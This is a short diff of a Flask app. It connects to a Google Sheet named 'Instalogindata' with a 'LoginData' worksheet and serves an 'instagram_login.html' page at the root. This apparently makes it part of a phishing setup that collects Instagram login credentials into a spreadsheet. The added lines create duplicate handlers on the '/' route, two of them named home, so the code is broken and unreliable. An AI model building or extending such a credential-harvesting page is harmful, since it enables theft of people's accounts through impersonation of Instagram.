@@ -16,6 +16,14 @@ creds = ServiceAccountCredentials.from_json_keyfile_dict(creds_json, scope)
 client = gspread.authorize(creds)
 sheet = client.open("Instalogindata").worksheet("LoginData")  # Match name exactly
 
+@app.route("/")
+def home():
+    return "Hello from Render"
+
+@app.route('/')
+def index():
+    return "Deployment successful!"
+
 @app.route("/", methods=["GET"])
 def home():
     return render_template("instagram_login.html")
